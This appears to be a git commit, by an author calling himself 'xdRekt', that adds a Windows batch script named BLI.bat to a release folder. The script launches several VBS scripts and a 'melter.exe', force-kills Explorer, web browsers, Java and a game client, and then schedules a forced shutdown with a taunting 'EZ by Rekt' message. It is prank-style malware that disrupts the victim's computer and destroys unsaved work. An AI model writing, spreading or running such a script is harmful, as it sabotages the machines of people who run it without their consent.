a5c329ddb44b31095cbc1a09d155942005c18e78
xdRekt <clorektyt@gmail.com>
2020-02-06 18:58:51 +0100

    Version 2.4

---
+++ src/2.4-release/BLI.bat
@@ -0,0 +1,22 @@
+@echo off
+start parle.vbs
+start screen.vbs
+start screen.vbs
+start screen.vbs
+start screen.vbs
+start screen.vbs
+timeout /t 30 /NOBREAK >nul
+taskkill /f /im explorer.exe
+taskkill /f /im javaw.exe
+taskkill /f /im chrome.exe
+taskkill /f /im firefox.exe
+taskkill /f /im msedge.exe
+taskkill /f /im h12.exe
+taskkill /f /im iexplorer.exe
+taskkill /f /im FortniteClient-Win64-Shipping.exe
+start melter.exe
+start loop.vbs
+start musicstart.vbs
+start dance.vbs
+start cd.vbs
+shutdown -s -t 300 -c "MMMMMM... EZ by Rekt"
